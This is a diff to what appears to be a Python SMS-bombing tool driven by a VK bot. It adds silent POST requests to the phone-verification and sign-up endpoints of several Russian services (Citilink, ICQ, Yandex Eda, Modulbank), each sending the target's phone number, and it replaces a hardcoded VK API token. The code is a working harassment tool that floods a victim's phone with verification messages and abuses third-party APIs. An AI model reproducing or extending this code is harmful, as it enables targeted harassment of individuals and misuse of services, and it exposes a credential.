@@ -60,9 +60,26 @@ try:
 			try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
 					data={"phone": pulse}, headers=headers, timeout=5.05)
 			except:pass
+			try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
+			except:pass
+			try:requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode", json={"reqId": "91101-1606335718", "params": {"phone": phone, "language": "ru-RU", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}, headers=headers)
+			except:pass
+			try: requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
+				"msisdn": phone,
+				"locale": "en",
+				"countryCode": "ru",
+				"version": "1",
+				"k": "ic1rtwz1s1Hj1O0r",
+				"r": "46763"
+			    }, headers=headers)
+			except:pass
+			try:requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code", json={"phone_number": phone}, headers=headers)
+			except:pass
+			try:requests.post("https://my.modulbank.ru/api/v2/auth/phone", data={"CellPhone": phone[1:]}, headers=headers)
+			except:pass
 
 
-	token = "ab483c22ea3083701535b91c09775f8507915943664a874f96aa2978eb0cdfc74c082"
+	token = "ab483c22ea3083701535b91c09775f8507915943664a874f96aa2978eb0cdfc74c0824f08acd700364872"
 	authorize = vk_api.VkApi(token=token)
 	longpoll = VkLongPoll(authorize)
 	for event in longpoll.listen():
